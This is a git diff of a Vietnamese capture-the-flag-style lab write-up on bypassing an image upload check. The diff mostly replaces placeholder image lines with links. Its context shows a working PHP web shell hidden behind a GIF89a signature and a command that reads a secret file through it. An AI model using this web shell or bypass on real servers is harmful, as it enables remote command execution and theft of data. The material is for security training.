@@ -17,22 +17,22 @@
 -	Kiểm tra xem liệu ta có thể upload và thực thi một file php bằng cách tạo một file tên _test.php_ với nội dung `<?php phpinfo(); ?>` và upload lên server.
 -	Server thông báo file upload không phải là file ảnh hợp lệ
 
-img
+![img3](./img/lab6/img1.png)
 
 - Thử đổi filename thành **test.png** và để `Content-Type: image/png` đồng thời giữ nguyên nội dung -> Server vẫn thông báo file upload không phải là file ảnh hợp lệ.
 
-img
+![img4](./img/lab6/img2.png)
 
 - Có vẻ như server đã kiểm tra nội dung file để xác định xem file upload có phải là file ảnh không?
 **Kiểm tra giả thuyết**
 - Thử upload file chứa mã PHP và chứa giá trị `GIF89a`, đây là signature(chữ ký định dạng) nằm ở phần đầu tiên của một file ảnh định dạng GIF.
 
-img
+![img5](./img/lab6/img3.png)
 
 - Upload file thành công và mã PHP được thực thi
 
-img
-img
+![img6](./img/lab6/img4.png)
+![img7](./img/lab6/img5.png)
 
 ## 3. Tiến hành khai thác
 - Upload file **shell.php** để thực hiện đọc tệp tin bí mật với nội dung:
@@ -40,10 +40,10 @@ img
 GIF89a
 <?php system($_GET['x']) ?>
 ```
-img
-img
+![img8](./img/lab6/img6.png)
+![img9](./img/lab6/img7.png)
 
 - Truyền tham số *'x'* để đọc nội dung tệp tin bí mật `x=cat%20/home/carlos/secret`
 
-img
+![img10](./img/lab6/img8.png)
 
